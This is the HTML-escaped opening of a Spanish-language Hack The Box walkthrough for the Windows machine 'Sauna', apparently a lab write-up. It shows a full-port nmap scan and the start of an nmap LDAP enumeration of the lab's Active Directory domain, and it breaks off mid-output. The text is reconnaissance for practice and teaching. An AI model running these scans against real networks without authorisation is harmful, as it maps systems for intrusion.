&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/229&#34;&gt;Sauna&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.175&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/94858&#34;&gt;egotisticalSW&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/94858&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[8.2, 7.9, 6.6, 3.4, 2.1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[10, 10, 10, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Feb 25 00:32:17 2020 as: nmap -p- --min-rate 1000 -sV -o nmap_scan 10.10.10.175&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.175
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65516&lt;/span&gt; filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2020-02-25 14:36:02Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
55601/tcp open  msrpc         Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2/25%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5E54C001%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSV
SF:ersionBindReqTCP,20,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x04bind\0\0\x10\0\x03&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: Host: SAUNA&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Feb 25 00:37:01 2020 -- 1 IP address (1 host up) scanned in 283.37 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap-ldap&#34;&gt;NMAP LDAP&lt;/h2&gt;
&lt;p&gt;Utilizamos el script ldap-search de nmap, y encontramos mucha informacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;90
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Feb 25 00:41:12 2020 as: nmap --script=ldap-search -p389 -o nmap_ldap_script 10.10.10.175&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.175
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.083s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE
389/tcp open  ldap
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ldap-search: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Context: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: domain
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: domainDNS
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         distinguishedName: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         instanceType: &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         whenCreated: 2020/01/23 05:44:25 UTC
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         whenChanged: 2020/02/25 14:32:31 UTC
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         subRefs: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         subRefs: &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         subRefs: &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOCAL
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uSNCreated: &lt;span class=&#34;m&#34;&gt;4099&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         dSASignature: &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;01&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;00@&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;BE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;E0&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B3&lt;span 